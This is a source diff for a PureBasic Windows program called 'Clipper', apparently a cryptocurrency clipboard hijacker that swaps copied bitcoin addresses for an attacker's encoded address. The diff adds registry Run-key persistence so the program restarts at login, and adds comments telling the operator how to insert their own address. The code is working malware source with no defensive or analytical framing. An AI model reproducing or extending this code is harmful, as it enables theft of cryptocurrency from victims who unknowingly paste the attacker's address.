@@ -2,10 +2,40 @@
 EnableExplicit
 
 Global Address.s
-Global MyAddress.s = "encoded bitcoin address"; enter your encoded bitcoin address here ( use Base.pb to encode your address )
+Global MyAddress.s = "encoded address here"; enter your encoded bitcoin address here ( compile/run Based.pb, open Based.txt and copy/paste the content here )
+Global StartupName.s = "Clipper"; name of the startup key
 Global Mutex.i, Thread.i
 
 UseSHA2Fingerprint()
+
+Procedure Startup()
+  Protected Key.l = #HKEY_CURRENT_USER
+  Protected Path.s = "Software\Microsoft\Windows\CurrentVersion\Run" 
+  Protected Value.s = StartupName
+  Protected String.s = Chr(34) + ProgramFilename() + Chr(34)
+  Protected CurKey.l
+  Protected errorCode = #ERROR_SUCCESS, hKey, bufferSize, type 
+  Protected State.b = #False
+  
+  errorCode = RegOpenKeyEx_(Key, Path, 0, #KEY_READ, @hKey)
+  If errorCode = #ERROR_SUCCESS
+    If hKey
+      errorCode = RegQueryValueEx_(hKey, StartupName, 0, @type, 0, @bufferSize)
+      If errorCode = #ERROR_SUCCESS
+        State = #False
+      Else
+        State = #True
+      EndIf
+      RegCloseKey_(hKey)
+    EndIf
+  EndIf
+  
+  If State 
+    RegCreateKey_(Key, @Path, @CurKey) 
+    RegSetValueEx_(CurKey, @Value, 0, #REG_SZ, String, 256) 
+  EndIf 
+  RegCloseKey_(CurKey) 
+EndProcedure
 
 Procedure.i DecodeBase58(Address$, Array result.a(1)) 
   Protected i, j, p
@@ -69,7 +99,7 @@ EndProcedure
 
 Start
   Define.L hMutex
-  Define.S MutexName = "5835f27e062417d3c161e0f9734aeefb"
+  Define.S MutexName = "5835f27e062417d3c161e0f9734aeefb"; unique process id, so as not to have multiple instances running
 
   hMutex = OpenMutex_(#MUTEX_ALL_ACCESS, 0, @MutexName)
 
@@ -77,8 +107,8 @@ Start
     End
   Else
     hMutex = CreateMutex_(0, 0, @MutexName)
-  
     Mutex = CreateMutex()
+    Startup()
     Thread = CreateThread(@Replace(), 0)
     WaitThread(Thread)
   EndIf
@@ -89,9 +119,8 @@ Start
 End
 
 ; IDE Options = PureBasic 5.50 (Windows - x86)
-; CursorPosition = 58
-; FirstLine = 48
-; Folding = -
-; Executable = Clipper.exe
-; DisableDebugger
+; CursorPosition = 101
+; FirstLine = 82
+; Folding = --
+; Executable = ..\Clipper.exe
 ; EnableUnicode
